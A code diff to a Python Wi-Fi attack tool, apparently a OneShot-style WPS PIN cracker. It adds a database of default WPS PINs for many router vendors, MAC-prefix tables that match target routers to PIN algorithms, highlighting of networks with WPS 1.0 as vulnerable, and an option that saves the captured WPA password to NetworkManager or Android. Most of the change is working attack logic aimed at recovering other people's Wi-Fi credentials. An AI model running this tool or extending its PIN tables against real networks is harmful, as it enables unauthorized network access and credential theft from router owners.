@@ -17,6 +17,11 @@ from pathlib import Path
 from typing import Dict
 import csv
 
+try:
+    import wcwidth
+except ImportError:
+    wcwidth = None
+
 #Auto Mode Hack: Global variable wasted_bssids
 wasted_bssids = {}
 locked_bssids = []
@@ -111,7 +116,29 @@ class WPSpin:
                       'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
                       # Static pin algos
                       'pinGeneric': {'name': 'Static', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 1234567, 'static': []},
-                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}}
+                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
+                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 1234567},
+                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 2017252},
+                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 4626484},
+                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 7622990},
+                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 6232714},
+                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 1086411},
+                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 3195719},
+                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 3043203},
+                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 7141225},
+                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 6817554},
+                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 9566146},
+                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 9571911},
+                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 4856371},
+                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 2085483},
+                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 4397768},
+                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 529417},
+                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 9995604},
+                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 3561153},
+                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 6795814},
+                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 3425928},
+                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 9422988},
+                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 9575521}}
 
     @staticmethod
     def checksum(pin):
@@ -144,6 +171,39 @@ class WPSpin:
         pin = pin % 10000000
         pin = str(pin) + str(self.checksum(pin))
         return pin.zfill(8)
+
+    def getAll(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC_DB and not get_static:
+                continue
+            item = {}
+            item['id'] = ID
+            if algo['mode'] == self.ALGO_STATIC_DB:
+                if ID == 'pinGeneric':
+                    continue
+                item['name'] = 'Static PIN — ' + algo['name']
+            else:
+                item['name'] = algo['name']
+            item['pin'] = self.generate(ID, mac)
+            res.append(item)
+        return res
+
+    def getList(self, mac, get_static=True):
+        """
+        Get all WPS pin's for single MAC as list
+        """
+        res = []
+        for ID, algo in self.algos.items():
+            if algo['mode'] == self.ALGO_STATIC_DB and not get_static:
+                continue
+            if ID == 'pinGeneric':
+                continue
+            res.append(self.generate(ID, mac))
+        return res
 
     def getSuggested(self, mac):
         """
@@ -200,8 +260,46 @@ class WPSpin:
         """
         self.append_from_pin_csv(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'pins.csv'), mac.upper())
         res = []
+        mac_str = mac.replace(':', '').upper()
+        algorithms = {
+            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
+            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
+            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
+            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
+            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
+            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
+            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
+            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
+            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
+            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
+            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
+            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
+            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
+            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
+            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
+            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
+            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
+            'pinRealtek2': ('007263', 'E4BEED'),
+            'pinRealtek3': ('08C6B3',),
+            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
+            'pinUR814AC': ('D4BF7F60',),
+            'pinUR825AC': ('D4BF7F5',),
+            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
+            'pinEdimax': ('801F02', '00E04C'),
+            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
+            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
+            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
+            'pinONO': ('5C353B', 'DC537C')
+        }
+        for algo_id, masks in algorithms.items():
+            if mac_str.startswith(masks) and algo_id not in res:
+                res.append(algo_id)
+
         for algo_id in self.algos:
-            res.append(algo_id)
+            if algo_id not in res:
+                res.append(algo_id)
 
         return res
 
@@ -480,7 +578,7 @@ class Companion:
                         'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
         return '[!] Something went wrong — check out debug log'
 
-    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
+    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
         if not verbose:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
@@ -594,6 +692,13 @@ class Companion:
             bssid = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bssid
             print('[*] Selected AP: {}'.format(bssid))
+        elif bssid in line and 'level=' in line:
+            signal = line.split("level=")[1].split(" ")[0]
+            if 'noise=' in line:
+                noise = line.split("noise=")[1].split(" ")[0]
+                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
+            else:
+                print ("[i] Current signal: {}".format(signal))
 
         return True
 
@@ -637,6 +742,28 @@ class Companion:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+
+    def __saveNetwork(self, bssid, essid, wpa_psk):
+        android_connect_cmd = [
+            'cmd', '-w', 'wifi', 'connect-network', f"{essid}", 'wpa2', f"{wpa_psk}", '-b', f"{bssid}"
+        ]
+        networkmanager_connect_cmd = [
+            'nmcli', 'connection', 'add', 'type', 'wifi', 'con-name', f"{essid}", 'ssid', f"{essid}", 
+            'wifi-sec.psk', f"{wpa_psk}", 'wifi-sec.key-mgmt', 'wpa-psk'
+        ]
+        if isAndroid():
+            try:
+                setupAndroidWifi(True)
+                subprocess.run(android_connect_cmd, check=True)
+                print('[*] Access Point was saved to Android network manager')
+            except subprocess.CalledProcessError as error:
+                print(f'[!] Failed to add network to Android network manager: \n {error}')
+        elif shutil.which('nmcli'):
+            try:
+                subprocess.run(networkmanager_connect_cmd, check=True)
+                print('[*] Access Point was saved to NetworkManager')
+            except subprocess.CalledProcessError as error:
+                print(f'[!] Failed to add network to NetworkManager: \n {error}')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -710,7 +837,7 @@ class Companion:
             return False
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
+            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower() if bssid else "")
             if not self.times:
                 break
             if not res:
@@ -770,6 +897,8 @@ class Companion:
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            if args.save:
+                self.__saveNetwork(bssid, self.connection_status.essid, self.connection_status.wpa_psk)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -939,6 +1068,7 @@ class WiFiScanner:
                     {
                         'Security type': 'Unknown',
                         'WPS': False,
+                        'WPS version': '1.0',
                         'WPS locked': False,
                         'Model': '',
                         'Model number': '',
@@ -971,12 +1101,21 @@ class WiFiScanner:
                 if result.group(1) == 'RSN':
                     sec = 'WPA/WPA2'
             elif sec == 'WPA2':
-                if result.group(1) == 'WPA':
+                if result.group(1) == 'PSK SAE':
+                    sec = 'WPA2/WPA3'
+                elif result.group(1) == 'WPA':
                     sec = 'WPA/WPA2'
             networks[-1]['Security type'] = sec
 
         def handle_wps(line, result, networks):
-            networks[-1]['WPS'] = result.group(1)
+            networks[-1]['WPS'] = bool(result.group(1))
+
+        def handle_wpsVersion(line, result, networks):
+            wps_ver = networks[-1]['WPS version']
+            wps_ver_filtered = result.group(1).replace('* Version2:', '')
+            if wps_ver_filtered == '2.0':
+                wps_ver = '2.0'
+            networks[-1]['WPS version'] = wps_ver
 
         def handle_wpsLocked(line, result, networks):
             flag = int(result.group(1), 16)
@@ -1011,6 +1150,8 @@ class WiFiScanner:
             re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
             re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
             re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+            re.compile(r' [*] Version2: (.+)'): handle_wpsVersion,
+            re.compile(r' [*] Authentication suites: (.+)'): handle_securityType,
             re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
             re.compile(r' [*] Model: (.*)'): handle_model,
             re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
@@ -1041,20 +1182,80 @@ class WiFiScanner:
         # Printing scanning results as table
         def truncateStr(s, length, postfix='…'):
             """
-            Truncate string with the specified length
-            @s — input string
-            @length — length of output string
+            Truncate strings according to display width (supports Full and half width characters)
+            :param s: input string
+            :param length: Maximum display width (unit: column)
+            :param postfix: Truncate suffixes (such as ellipses)
             """
-            if len(s) > length:
-                k = length - len(postfix)
-                s = s[:k] + postfix
-            return s
+            if wcwidth is None:
+                if len(s) > length:
+                    k = length - len(postfix)
+                    s = s[:k] + postfix
+                return s
+
+            # Calculate the original display width
+            original_width = wcwidth.wcswidth(s)
+            
+            # Scenario 1: The original width is exactly the same or smaller
+            if original_width <= length:
+                # Calculate the number of spaces to be filled (by display width)
+                padding_needed = length - original_width
+                # Allocate spaces evenly to the right of the string
+                return s + ' ' * padding_needed
+            
+            # Scenario 2: Truncation is required
+            postfix_width = wcwidth.wcswidth(postfix)
+            max_allowed = length - postfix_width
+            
+            current_width = 0
+            truncated = []
+            for c in s:
+                char_width = wcwidth.wcswidth(c)
+                if current_width + char_width > max_allowed:
+                    break
+                truncated.append(c)
+                current_width += char_width
+            
+            # Construct basic results
+            result = "".join(truncated)
+            if len(truncated) < len(s):
+                result += postfix
+            
+            # Accurately adjust the display width
+            result_width = wcwidth.wcswidth(result)
+            if result_width > length:
+                # Remove pre truncation restrictions and switch to more precise truncation
+                # Emergency cutoff (to prevent exceeding the limit)
+                # Change to character by character processing to ensure not exceeding the limit
+                current_width = 0
+                safe_truncated = []
+                for c in result:
+                    char_width = wcwidth.wcswidth(c)
+                    if current_width + char_width > length:
+                        break
+                    safe_truncated.append(c)
+                    current_width += char_width
+                safe_result = "".join(safe_truncated)
+                # If the truncated string becomes shorter, add ellipsis
+                if len(safe_result) < len(result):
+                    safe_result += postfix
+                    # Recheck the width
+                    if wcwidth.wcswidth(safe_result) > length:
+                        # If the limit is still exceeded after adding ellipsis, remove the ellipsis
+                        safe_result = safe_result[:-1]
+                return safe_result
+            
+            # Fill in exact spaces
+            padding_needed = length - result_width
+            return result + ' ' * padding_needed
 
         def colored(text, color=None):
             """Returns colored text"""
             if color:
                 if color == 'green':
                     text = '\033[92m{}\033[00m'.format(text)
+                elif color == 'dark_green':
+                    text = '\033[32m{}\033[00m'.format(text)
                 elif color == 'red':
                     text = '\033[91m{}\033[00m'.format(text)
                 elif color == 'yellow':
@@ -1068,16 +1269,17 @@ class WiFiScanner:
             return text
 
         if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
+            print('Network marks: {1} {0} {2} {0} {3} {0} {4} {0} {5}'.format(
                 '|',
                 colored('Possibly vulnerable', color='green'),
+                colored('Vulnerable WPS ver.', color='dark_green'),
                 colored('WPS locked', color='red'),
                 colored('Already stored', color='yellow'),
                 colored('Wasted', color='grey')
             ))
         print('Networks list:')
-        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
-            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<4} {:<27} {:<}'.format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ver.', 'WSC device name', 'WSC model'))
 
         network_list_items = list(network_list.items())
         if args.reverse_scan:
@@ -1087,15 +1289,17 @@ class WiFiScanner:
             model = '{} {}'.format(network['Model'], network['Model number'])
             essid = truncateStr(network['ESSID'], 25)
             deviceName = truncateStr(network['Device name'], 27)
-            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<4} {:<27} {:<}'.format(
                 number, network['BSSID'], essid,
                 network['Security type'], network['Level'],
-                deviceName, model
+                network['WPS version'], deviceName, model
                 )
             if not network['WPS locked'] and network['BSSID'] in locked_bssids:
                 locked_bssids.remove(network['BSSID'])
             if (network['BSSID'], network['ESSID']) in self.stored:
                 print(colored(line, color='yellow')) 
+            elif network['WPS version'] == '1.0':
+                print(colored(line, color='dark_green'))
             elif network['WPS locked']:
                 print(colored(line, color='red'))
                 if network['BSSID'] not in locked_bssids:
@@ -1151,6 +1355,8 @@ class WiFiScanner:
             try:
                 networkNo = input('Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
+                    if args.clear:
+                        os.system('clear')
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
                     if networks[int(networkNo)]['ESSID'] is None:
@@ -1163,16 +1369,40 @@ class WiFiScanner:
                 print('Invalid number')
 
 
+def isAndroid():
+    """Check if this project is ran on android."""
+    return bool(hasattr(sys, 'getandroidapilevel'))
+
+def setupAndroidWifi(enable=False):
+    if not isAndroid():
+        return
+    action = 'enabled' if enable else 'disabled'
+    subprocess.run(['cmd', '-w', 'wifi', 'set-wifi-enabled', action], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 def ifaceUp(iface, down=False):
     if down:
         action = 'down'
     else:
         action = 'up'
+    
     cmd = 'ip link set {} {}'.format(iface, action)
-    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
+    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+    
+    command_output_stripped = res.stdout.strip()
+
+    if not isAndroid() and 'RF-kill' in command_output_stripped:
+        print('[-] RF-kill is blocking the interface, unblocking')
+        try:
+            subprocess.run(['rfkill', 'unblock', 'wifi'], check=True)
+            res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
+        except (subprocess.CalledProcessError, FileNotFoundError) as error:
+            print(f'[!] Failed to unblock interface, not continuing: \n {error}')
+            return False
+
     if res.returncode == 0:
         return True
     else:
+        print(f'[!] {command_output_stripped}')
         return False
 
 
@@ -1203,6 +1433,8 @@ def usage():
         -d, --delay=<n>          : Set the delay between pin attempts [0]
         -t, --times=<n>          : Number of times to try a weak signalled AP before moving on
         -w, --write              : Write AP credentials to the file on success
+        -S, --save               : Save the network to NetworkManager/Android on success
+        -c, --clear              : Clear screen before prompting for network
         -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
         -P, --pin-index          : Select from index of automatically generated pins
         -X, --show-pixie-cmd     : Always print Pixiewps command
@@ -1299,6 +1531,16 @@ if __name__ == '__main__':
         help='Write credentials to the file on success'
         )
     parser.add_argument(
+        '-S', '--save',
+        action='store_true',
+        help='Save the network to NetworkManager/Android on success'
+        )
+    parser.add_argument(
+        '-c', '--clear',
+        action='store_true',
+        help='Clear screen before prompting for network'
+        )
+    parser.add_argument(
         '--iface-down',
         action='store_true',
         help='Down network interface when the work is finished'
@@ -1359,6 +1601,8 @@ if __name__ == '__main__':
 
     while True:
         try:
+            if not args.mtk_wifi:
+                setupAndroidWifi(False)
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
@@ -1399,6 +1643,9 @@ if __name__ == '__main__':
             else:
                 print("\nAborting…")
                 break
+        finally:
+            if not args.mtk_wifi:
+                setupAndroidWifi(True)
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
